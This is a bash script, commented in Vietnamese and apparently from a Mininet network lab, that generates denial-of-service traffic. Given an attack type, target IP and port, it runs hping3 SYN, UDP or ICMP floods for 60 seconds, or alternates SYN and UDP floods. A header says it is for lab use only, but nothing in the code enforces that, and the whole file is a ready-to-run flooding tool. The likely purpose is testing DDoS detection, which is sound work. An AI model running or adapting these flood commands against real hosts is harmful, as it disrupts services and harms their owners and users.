#!/bin/bash
# =============================================================
# ddos_traffic.sh — Sinh traffic DDoS (SYN Flood / UDP Flood)
#
# CẢNH BÁO: Chỉ dùng trong môi trường lab Mininet!
#            Không chạy trên mạng thực!
#
# Cách dùng trong Mininet CLI:
#   mininet> h2 bash traffic/ddos_traffic.sh syn h1 80
#   mininet> h2 bash traffic/ddos_traffic.sh udp h1 53
#   mininet> h2 bash traffic/ddos_traffic.sh icmp h1
#
# Tham số:
#   $1 = attack_type: syn | udp | icmp
#   $2 = target_ip:   IP của victim host
#   $3 = target_port: Port (cho SYN/UDP)
# =============================================================

ATTACK_TYPE=${1:-"syn"}
TARGET_IP=${2:-"10.0.0.1"}
TARGET_PORT=${3:-"80"}
DURATION=60   # giây

echo "========================================"
echo " DDoS Traffic Generator"
echo " Type:     $ATTACK_TYPE"
echo " Target:   $TARGET_IP:$TARGET_PORT"
echo " Duration: ${DURATION}s"
echo "========================================"

case "$ATTACK_TYPE" in

    syn)
        echo "[*] Launching SYN Flood attack..."
        echo "    hping3 -S --flood -V -p $TARGET_PORT $TARGET_IP"
        timeout $DURATION hping3 \
            -S \
            --flood \
            -V \
            -p "$TARGET_PORT" \
            "$TARGET_IP"
        ;;

    udp)
        echo "[*] Launching UDP Flood attack..."
        echo "    hping3 --udp --flood -p $TARGET_PORT $TARGET_IP"
        timeout $DURATION hping3 \
            --udp \
            --flood \
            -p "$TARGET_PORT" \
            "$TARGET_IP"
        ;;

    icmp)
        echo "[*] Launching ICMP Flood attack..."
        echo "    hping3 --icmp --flood $TARGET_IP"
        timeout $DURATION hping3 \
            --icmp \
            --flood \
            "$TARGET_IP"
        ;;

    mixed)
        echo "[*] Launching Mixed DDoS (SYN + UDP alternating)..."
        for i in $(seq 1 3); do
            echo "  Round $i: SYN Flood (10s)..."
            timeout 10 hping3 -S --flood -p 80 "$TARGET_IP"
            echo "  Round $i: UDP Flood (10s)..."
            timeout 10 hping3 --udp --flood -p 53 "$TARGET_IP"
        done
        ;;

    *)
        echo "[ERROR] Unknown attack type: $ATTACK_TYPE"
        echo "        Use: syn | udp | icmp | mixed"
        exit 1
        ;;
esac

echo ""
echo "[*] DDoS traffic generation completed."
